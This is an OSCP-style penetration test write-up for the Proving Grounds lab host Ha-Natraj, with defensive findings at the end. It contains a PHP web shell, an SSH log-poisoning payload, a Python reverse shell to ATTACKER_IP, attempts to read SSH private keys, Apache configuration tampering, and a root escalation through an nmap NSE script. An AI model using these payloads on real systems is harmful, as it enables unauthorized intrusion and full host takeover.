# PG Play Ha-Natraj - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-5-13

---

## 1. Executive Summary

A penetration test was conducted against the target host “Ha-Natraj” in the Offensive Security Proving Grounds Play environment. The assessment identified a vulnerable file inclusion functionality within a web application console interface.

Initial access was achieved through exploitation of a Local File Inclusion (LFI) vulnerability combined with SSH log poisoning, resulting in remote command execution as the `www-data` user. Post-exploitation enumeration revealed the ability to restart Apache through sudo permissions, allowing privilege escalation to the user `mahakal`.

Further privilege escalation to root was achieved through insecure sudo permissions allowing execution of `nmap` with elevated privileges.

The system was fully compromised.

---

## 2. Scope

- **Target:** 192.168.209.80
- **Environment:** PG Play Ha-Natraj
- **Testing Window:** 2026-5-12 to 2026-5-13
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

### TCP Port Enumeration

Command:

```
nmap -p- -sC -sV 192.168.209.80 -T4 -oA hanatraj_tcp
```

Relevant Output:

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29
```

Interpretation:

The target exposed SSH and HTTP services. The Apache web application became the primary attack surface.

---

## 5. Enumeration

### Directory Enumeration

A Gobuster scan was performed against the web service.

Command:

```
gobuster dir -u http://192.168.209.80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Relevant Output:

```
/console
```

Interpretation:

The `/console` endpoint was identified and appeared to contain PHP functionality.

### Subdomain Enumeration

Virtual host fuzzing was performed.

Command:

```
ffuf -u http://192.168.209.80 -H "Host: FUZZ.192.168.209.80" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

Interpretation:

No immediately useful subdomains were identified.

### File Upload Testing

A PHP web shell was prepared.

Payload:

```
<?php system($_GET['cmd']); ?>
```

Upload attempt:

```
curl -X POST "http://192.168.209.80/console/" -F 'file=cmd.php'
```

Interpretation:

Direct upload functionality was not available through the console interface.

### Parameter Fuzzing

Parameter fuzzing was performed against the discovered PHP endpoint.

Command:

```
wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://192.168.209.80/console/file.php?FUZZ=/../../../../../../../etc/passwd
```

Relevant Output:

```
file
```

Interpretation:

The `file` parameter appeared vulnerable to Local File Inclusion (LFI).

### Verify Local File Inclusion

Command:

```
http://192.168.209.80/console/file.php?file=/../../../../../../etc/passwd
```

Relevant Output:

```
natraj
mahakal
```

Interpretation:

The application was vulnerable to arbitrary file disclosure through LFI.

### Test Remote File Inclusion

Command:

```
http://192.168.209.80/console/file.php?file=http://ATTACKER_IP/AAAA
```

Interpretation:

Remote File Inclusion (RFI) was not successful.

### Sensitive File Enumeration

The following files were tested through the LFI vulnerability:

```
/var/log/apache2/access.log
/proc/self/environ
/home/natraj/.ssh/id_rsa
/home/mahakal/.ssh/id_rsa
/var/log/auth.log
```

Interpretation:

The SSH authentication log (`/var/log/auth.log`) appeared suitable for log poisoning attacks.

---

## 6. Initial Access

### SSH Log Poisoning

A malicious SSH username containing PHP code was injected into the authentication logs.

Command:

```
nc -nv 192.168.209.80 22
```

Injected Payload:

```
thisislogpoisoning/<?php passthru($_GET['cmd']); ?>
```

Interpretation:

The malicious payload was written into the SSH authentication log.

### Trigger Command Execution

The poisoned log file was included through the vulnerable endpoint.

Command:

```
http://192.168.209.80/console/file.php?file=/../../../../../../var/log/auth.log&cmd=id
```

Relevant Output:

```
uid=33(www-data) gid=33(www-data)
```

Interpretation:

Remote command execution was achieved as the `www-data` user.

### Reverse Shell

An initial Bash reverse shell attempt failed.

A Python3 reverse shell payload was then used successfully.

Listener:

```
rlwrap nc -lnvp 443
```

Payload:

```
http://192.168.209.80/console/file.php?file=/../../../../../../var/log/auth.log&cmd=python3%20-c%20%27import%20os,pty,socket;s=socket.socket();s.connect((%22ATTACKER_IP%22,443));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(%22bash%22)%27
```

Verification:

Commands:

```
whoami
hostname
```

Output:

```
www-data
ha-natraj
```

Interpretation:

A reverse shell was successfully established as `www-data`.

---

## 7. Post-Exploitation

### Privilege Enumeration

Basic enumeration was performed.

Commands:

```
sudo -l
find / -perm -u=s -type f -ls 2>/dev/null
find / -perm -g=s -type f -ls 2>/dev/null
uname -a
```

Interpretation:

Enumeration identified sudo permissions related to Apache service management.

### Process Enumeration

Command:

```
ps aux | grep -i 'apache'
```

Relevant Output:

```
www-data
```

Interpretation:

Apache was confirmed to run under the `www-data` account.

### Apache Configuration Enumeration

The Apache configuration file was reviewed.

Command:

```
cat /etc/apache2/apache2.conf
```

Interpretation:

The Apache configuration referenced dynamic user and group variables.

### Writable Apache Configuration Abuse

The Apache configuration file was copied locally and modified.

Command:

```
cp /etc/apache2/apache2.conf .
```

Command:

```
sed -i 's/User ${APACHE_RUN_USER}/User mahakal/g' apache2.conf
```

Command:

```
sed -i 's/Group ${APACHE_RUN_GROUP}/Group mahakal/g' apache2.conf
```

Command:

```
cp apache2.conf /etc/apache2/apache2.conf
```

Interpretation:

The Apache service configuration was modified to run as the user `mahakal`.

### Restart Apache

Command:

```
sudo /bin/systemctl restart apache2
```

Interpretation:

Restarting Apache caused the service to execute under the `mahakal` account context.

### Obtain Shell as mahakal

The SSH log poisoning technique was repeated.

Listener:

```
rlwrap nc -lnvp 443
```

Payload:

```
http://192.168.209.80/console/file.php?file=/../../../../../../var/log/auth.log&cmd=python3%20-c%20%27import%20os,pty,socket;s=socket.socket();s.connect((%22ATTACKER_IP%22,443));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(%22bash%22)%27
```

Verification:

Command:

```
whoami
```

Output:

```
mahakal
```

Interpretation:

Interactive access was obtained as the user `mahakal`.

---

## 8. Privilege Escalation

### Sudo Enumeration

Command:

```
sudo -l
```

Relevant Output:

```
(ALL) NOPASSWD: /usr/bin/nmap
```

Interpretation:

The user `mahakal` could execute `nmap` as root through sudo.

### GTFOBins Abuse

GTFOBins techniques for `nmap` were tested.

### Nmap Interactive Shell

Command:

```
sudo /usr/bin/nmap --interactive
```

Interpretation:

Interactive mode was not available for the final escalation path.

### Nmap NSE Script Abuse

A malicious NSE script was created.

Command:

```
cd /dev/shm
```

Command:

```
echo 'os.execute("/bin/dash")' > rootdash
```

Command:

```
sudo /usr/bin/nmap --script=rootdash
```

Verification:

Commands:

```
whoami
hostname
id
```

Output:

```
root
ha-natraj
uid=0(root) gid=0(root)
```

Interpretation:

Privilege escalation to root was successful through abuse of sudo-allowed `nmap` execution.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

Command:

```
cat /var/www/local.txt
```

---

**Root Flag**: *REDACTED*

Command:

```
cat /root/proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Local File Inclusion Vulnerability

**Severity:** Critical

**Description:**
The web application allowed arbitrary local file inclusion through an unsanitized file parameter.

**Impact:**
Attackers could read sensitive files and leverage log poisoning techniques to achieve remote code execution.

**Recommendation:**
Validate and sanitize all user-controlled file path input and implement strict allowlists for accessible files.

### **Finding:** SSH Log Poisoning Leading to Remote Code Execution

**Severity:** Critical

**Description:**
User-controlled data written into authentication logs could be interpreted as executable PHP code through file inclusion.

**Impact:**
Attackers could inject arbitrary PHP code into logs and execute commands remotely.

**Recommendation:**
Prevent direct inclusion of log files within web applications and sanitize log content before processing.

### **Finding:** Insecure Sudo Permissions Allowing Service Abuse

**Severity:** High

**Description:**
The `www-data` account could restart Apache services through sudo permissions.

**Impact:**
Attackers could manipulate Apache configuration files to execute the service under another user account.

**Recommendation:**
Restrict sudo access to required administrative personnel and prevent service management by low-privileged accounts.

### **Finding:** Insecure Sudo Permissions Allowing Root Command Execution via Nmap

**Severity:** Critical

**Description:**
The user `mahakal` could execute `nmap` as root through sudo without restrictions.

**Impact:**
Attackers could abuse Nmap scripting functionality to execute arbitrary commands as root.

**Recommendation:**
Remove unnecessary sudo permissions and restrict execution of binaries capable of arbitrary command execution.